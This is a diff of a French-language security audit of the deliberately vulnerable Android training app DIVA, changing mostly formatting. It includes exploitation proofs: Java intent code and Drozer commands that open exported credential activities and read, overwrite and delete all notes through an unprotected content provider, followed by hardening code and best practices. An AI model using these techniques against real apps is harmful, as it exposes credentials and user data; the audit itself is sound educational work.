@@ -46,8 +46,9 @@ Impact: Exposition de données API supplémentaires
 
 Exploitation Possible:
 
-# Lancer MainActivity Intent intent = new Intent(); intent.setComponent(new
+ Lancer MainActivity Intent intent = new Intent(); intent.setComponent(new
 ComponentName( "jakhar.aseem.diva", "jakhar.aseem.diva.MainActivity" ));
+
 startActivity(intent); # Avec Drozer dz> run app.activity.start \ --component
 jakhar.aseem.diva \ jakhar.aseem.diva.APICredsActivity
 
@@ -57,8 +58,11 @@ jakhar.aseem.diva \ jakhar.aseem.diva.APICredsActivity
 <img width="778" height="303" alt="image" src="https://github.com/user-attachments/assets/e9c4149d-2125-433f-9ae4-2e4989ab6a4c" />
 
  Analyse:
+ 
 Services Exportés: Aucun détecté 
+
 Broadcast Receivers Exportés: Aucun détecté 
+
 Statut: Cette application réduit la surface d'attaque en n'exposant pas de services ou receivers
 
 *Configuration du Content Provider*
@@ -66,10 +70,15 @@ Statut: Cette application réduit la surface d'attaque en n'exposant pas de serv
 <img width="913" height="343" alt="Screenshot 2026-05-02 161705" src="https://github.com/user-attachments/assets/0b510206-d992-4741-8458-ad5e0ea42a10" />
 
  Impact Critique:
+
 ■ Accès illimité en lecture à TOUTES les notes de l'application
+
 ■ Accès illimité en écriture pour modifier/supprimer les notes
+
 ■ Aucun mécanisme d'authentification ou d'autorisation
+
 ■ Données utilisateur exfiltrables par n'importe quelle application
+
 ■ Violation complète de la confidentialité des données
 
 * ANALYSE DU MANIFEST*
@@ -107,10 +116,15 @@ Chaque activity peut être lancée directement via intent explicite par une appl
 Analyse des Intent Filters:
 
 MainActivity: Intent Filter: Actions: android.intent.action.MAIN Categories:
+
 android.intent.category.LAUNCHER APICredsActivity: Intent Filter: Actions:
+
 jakhar.aseem.diva.action.VIEW_CREDS Categories: android.intent.category.DEFAULT =>
+
 Accessible via intent implicite APIcreds2Activity: Intent Filter: Actions:
+
 jakhar.aseem.diva.action.VIEW_CREDS2 Categories: android.intent.category.DEFAULT =>
+
 Accessible via intent implicite
 
 *Découverte des Content Provider URIs*
@@ -120,14 +134,18 @@ Accessible via intent implicite
 <img width="1043" height="261" alt="Screenshot 2026-05-02 162416" src="https://github.com/user-attachments/assets/c4c2b98b-7c25-496a-9a52-4a8257ba12e8" />
 
  URIs Accessibles Confirmées:
+
 URI: content://jakhar.aseem.diva.provider.notesprovider/notes
+
 Statut: Accessible
+
 Données: TOUTES les notes
 
  PREUVES D'EXPLOITATION
+
  Exploitation du Content Provider
  
-# Lister les données via Content Provider dz> run app.provider.query \
+Lister les données via Content Provider dz> run app.provider.query \
 content://jakhar.aseem.diva.provider.notesprovider/notes # Résultat: Extraction de toutes
 les notes stockées # Modifier les données dz> run app.provider.update \
 content://jakhar.aseem.diva.provider.notesprovider/notes \ --string title "Hacked" \
@@ -135,7 +153,7 @@ content://jakhar.aseem.diva.provider.notesprovider/notes \ --string title "Hacke
 app.provider.delete \ content://jakhar.aseem.diva.provider.notesprovider/notes
  Exploitation des Activities
  
-# Lancer APICredsActivity directement Intent intent = new Intent();
+ Lancer APICredsActivity directement Intent intent = new Intent();
 intent.setComponent(new ComponentName( "jakhar.aseem.diva",
 "jakhar.aseem.diva.APICredsActivity" )); startActivity(intent); # Result: Affichage de
 toutes les données d'identification API # Avec Drozer dz> run app.activity.start \
@@ -146,26 +164,42 @@ RECOMMANDATIONS DE SÉCURISATION
  Sécuriser le Content Provider
 
 @Override public Cursor query(Uri uri, String[] projection, String selection, String[]
+
 selectionArgs, String sortOrder) { // Vérifier la permission int perm =
+
 checkCallingPermission( "com.jakhar.permission.READ_NOTES" ); if (perm !=
+
 PackageManager.PERMISSION_GRANTED) { throw new SecurityException("Permission denied"); }
+
 return super.query(uri, projection, selection, selectionArgs, sortOrder); }
 
  Sécuriser les Activities
 
 @Override protected void onCreate(Bundle savedInstanceState) {
+
 super.onCreate(savedInstanceState); // Vérifier l'authentification if
+
 (!isUserAuthenticated()) { startActivity(new Intent(this, LoginActivity.class));
+
 finish(); return; } // Vérifier les permissions if
+
 (checkCallingPermission("com.example.VIEW_DATA") != PackageManager.PERMISSION_GRANTED) {
+
 finish(); return; } setContentView(R.layout.main); }
 
  Meilleures Pratiques
+
 ■ Utiliser android:exported="false" par défaut
+
 ■ Implémenter une authentification forte
+
 ■ Utiliser des permissions personnalisées pour les composants sensibles
+
 ■ Valider tous les extras d'intent
+
 ■ Implémenter un contrôle d'accès granulaire
+
 ■ Chiffrer les données sensibles au repos et en transit
+
 ■ Tester régulièrement avec Drozer
 ■ Implémenter la journalisation et l'audit
